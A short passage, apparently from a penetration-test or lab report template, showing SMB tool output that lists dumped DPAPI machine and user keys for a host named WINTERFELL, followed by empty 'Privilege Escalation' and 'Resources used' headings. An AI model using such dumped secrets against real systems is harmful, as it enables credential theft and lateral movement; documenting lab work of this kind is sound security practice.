SMB         10.10.10.11     445    WINTERFELL       dpapi_machinekey:0xa07dedba3f42b271fbb70b6712eaec73474ed8c7
dpapi_userkey:0x1883acd917d81da855076b023f86c1892f3ba2fa

```

# Privilege Escalation

Document how you were able to more laterally and gain a higher privilege

# Resources used

Action items, timeline, and resource requirements